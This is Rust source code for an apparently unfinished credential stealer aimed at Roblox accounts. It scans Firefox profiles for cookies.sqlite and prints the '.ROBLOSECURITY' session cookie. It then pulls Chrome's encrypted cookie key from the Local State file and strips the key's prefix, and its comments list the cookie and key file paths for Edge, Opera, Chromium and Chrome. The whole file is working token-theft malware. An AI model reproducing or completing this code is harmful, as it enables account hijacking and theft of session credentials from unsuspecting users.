use platform_dirs::AppDirs;
use std::fs::{self};
use std::str;
use std::fs::File;
use std::io::Read;
use serde_json;
use base64::{encode, decode};

fn main() {
    // firefox
    // quiry // select host, path, isSecure, expiry, name, value from moz_cookies
    // C:\Users\emmet\AppData\Roaming\Mozilla\Firefox\Profiles looking for a cookies.sqlite file
    println!("Firefox");
    let app_dirs = AppDirs::new(Some(""), true).unwrap();
    let roaming = app_dirs.config_dir;
    let local = app_dirs.cache_dir;
    let firefox_profile_path = roaming.join("Mozilla").join("Firefox").join("Profiles");
    if firefox_profile_path.is_dir() {
        for path in fs::read_dir(firefox_profile_path).unwrap() {
            let sqlite_db = path.unwrap().path().join("cookies.sqlite");
            if sqlite_db.exists() {
                let connection = sqlite::open(sqlite_db).unwrap();
                connection
                    .iterate(
                        "select host, path, isSecure, expiry, name, value from moz_cookies",
                        |pairs| {
                            //println!("fuck");
                            if pairs[4].1 == Some(".ROBLOSECURITY") {
                                println!("{:?}", pairs[5].1.unwrap());
                            }
                            // for &(column, value) in pairs.iter() {
                            //     println!("{} = {}", column, value.unwrap());
                            // }
                            true
                        },
                    )
                    .unwrap();
            }
        }
    }
    println!("chrome");
    let chrome_user_data_folder = local.join("Google").join("Chrome").join("User Data");
    let chrome_default_state = chrome_user_data_folder.join("Local State");
    let chrome_cookies = chrome_user_data_folder.join("Default").join("Cookies");


    let mut chrome_default_state_file = File::open(&chrome_default_state).expect("failed to open json key file");
    let mut chrome_default_state_contents = String::new();
    chrome_default_state_file.read_to_string(&mut chrome_default_state_contents).expect("failed to write to string");

    // let mut chrome_cookies_file = File::open(&chrome_cookies).expect("failed to open json key file");
    // let mut chrome_cookies_contents = String::new();
    // chrome_cookies_file.read_to_string(&mut chrome_cookies_contents).expect("failed to write to string");

    let key_file_json: serde_json::Value = serde_json::from_str(chrome_default_state_contents.as_str()).expect("JSON was not well-formatted");
    // println!("{}",key_file_json);
    let key64 = &key_file_json["os_crypt"]["encrypted_key"];
    let mut b_64_decoded = decode(key64.as_str().unwrap()).expect("msg: &str");
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    b_64_decoded.remove(0);
    println!("{:?}",&b_64_decoded);

    // \Google\Chrome\User Data\Local State
    // \Google\Chrome\User Data\Default\Cookies

    // everything else
    //     'windows_cookies':[
    //         {'env':'APPDATA', 'path':'..\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies'},
    //         {'env':'LOCALAPPDATA', 'path':'Microsoft\\Edge\\User Data\\Default\\Cookies'},
    //         {'env':'APPDATA', 'path':'Microsoft\\Edge\\User Data\\Default\\Cookies'}
    // ],
    //     'windows_keys': [
    //         {'env':'APPDATA', 'path':'..\\Local\\Microsoft\\Edge\\User Data\\Local State'},
    //         {'env':'LOCALAPPDATA', 'path':'Microsoft\\Edge\\User Data\\Local State'},
    //         {'env':'APPDATA', 'path':'Microsoft\\Edge\\User Data\\Local State'}
    // ],

    //     'windows_cookies':[
    //         {'env':'APPDATA', 'path':'..\\Local\\Opera Software\\Opera Stable\\Cookies'},
    //         {'env':'LOCALAPPDATA', 'path':'Opera Software\\Opera Stable\\Cookies'},
    //         {'env':'APPDATA', 'path':'Opera Software\\Opera Stable\\Cookies'}
    // ],
    // 'windows_keys': [
    //         {'env':'APPDATA', 'path':'..\\Local\\Opera Software\\Opera Stable\\Local State'},
    //         {'env':'LOCALAPPDATA', 'path':'Opera Software\\Opera Stable\\Local State'},
    //         {'env':'APPDATA', 'path':'Opera Software\\Opera Stable\\Local State'}
    // ],

    //     'windows_cookies':[
    //         {'env':'APPDATA', 'path':'..\\Local\\Chromium\\User Data\\Default\\Cookies'},
    //         {'env':'LOCALAPPDATA', 'path':'Chromium\\User Data\\Default\\Cookies'},
    //         {'env':'APPDATA', 'path':'Chromium\\User Data\\Default\\Cookies'}
    // ],
    // 'windows_keys': [
    //         {'env':'APPDATA', 'path':'..\\Local\\Chromium\\User Data\\Local State'},
    //         {'env':'LOCALAPPDATA', 'path':'Chromium\\User Data\\Local State'},
    //         {'env':'APPDATA', 'path':'Chromium\\User Data\\Local State'}
    // ],

    //     'windows_cookies':[
    //         {'env':'APPDATA', 'path':'..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'},
    //         {'env':'LOCALAPPDATA', 'path':'Google\\Chrome\\User Data\\Default\\Cookies'},
    //         {'env':'APPDATA', 'path':'Google\\Chrome\\User Data\\Default\\Cookies'}
    //     ],
    // 'windows_keys': [
    //         {'env':'APPDATA', 'path':'..\\Local\\Google\\Chrome\\User Data\\Local State'},
    //         {'env':'LOCALAPPDATA', 'path':'Google\\Chrome\\User Data\\Local State'},
    //         {'env':'APPDATA', 'path':'Google\\Chrome\\User Data\\Local State'}
    //     ],
}
